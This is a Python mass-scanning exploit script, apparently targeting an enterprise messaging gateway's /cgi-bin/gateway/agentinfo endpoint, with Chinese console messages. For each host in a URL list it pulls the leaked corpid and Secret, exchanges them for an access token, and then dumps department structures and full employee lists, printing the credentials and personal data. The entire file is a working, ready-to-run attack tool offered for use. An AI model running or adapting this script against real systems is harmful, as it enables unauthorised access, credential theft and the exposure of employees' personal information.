import requests
import json
import urllib3

urllib3.disable_warnings()
GREEN = '\033[92m'
RED = '\033[91m'
PURPLE = '\033[95m'
BLUE = '\033[94m'
RESET = '\033[0m'


def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file.readlines()]
    return urls


def send_get_request(url, timeout=2):
    try:
        response = requests.get(url, timeout=timeout, verify=False)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"


def extract_corpid_secret(json_data):
    strcorpid = json_data.get("strcorpid", None)
    secret = json_data.get("Secret", None)
    return strcorpid, secret


def main():
    file_path = 'url.txt'
    urls = read_urls_from_file(file_path)

    for url in urls:
        url1 = url + '/cgi-bin/gateway/agentinfo'
        response_content = send_get_request(url1)
        try:
            data = json.loads(response_content)
        except json.JSONDecodeError:
            print("[-]该url没有漏洞")
            continue

        corpid, secret = extract_corpid_secret(data)

        if corpid and secret:
            print(f"{RESET}URL: {url1}")
            print(f"{GREEN}[+]「corpid」: {corpid}{RESET}")
            print(f"{GREEN}[+]「Secret」: {secret}{RESET}")
            token_url = f"{url}/cgi-bin/gettoken?corpid={corpid}&corpsecret={secret}"
            # print(f"tokenurl{token_url}")
            # print(token_url)
            token_response = send_get_request(token_url)
            data1 = json.loads(token_response)
            flag = data1.get("errcode", None)
            if flag == 0:
                # access_token
                token = data1.get("access_token", None)
                # 部门信息
                info_url = f"{url}/cgi-bin/department/list?access_token={token}"
                depart_response = send_get_request(info_url)
                data_dp = json.loads(depart_response)
                depart_info = data_dp.get("department", None)
                # 部门成员信息
                person_url = f"{url}/cgi-bin/user/list?access_token={token}&department_id=1&fetch_child=1"
                person_response = send_get_request(person_url)
                data_per = json.loads(person_response)
                person_info = data_per.get("userlist", None)

                print(f"{RED}[+]「access_token」: {token}{RESET}")
                print(f"{PURPLE}「部门信息」: {depart_info}{RESET}")
                print(f"{BLUE}「部门成员信息」: {person_info}{RESET}")

        else:
            print(f"URL: {url1}")
            print("corpid or Secret not found in the response.")


if __name__ == "__main__":
    print(f"{RED}「**********Scaning**********」\n「**********开始扫描*********」\n「**********Scaning**********」\n「**********Scaning**********」{RESET}")
    main()
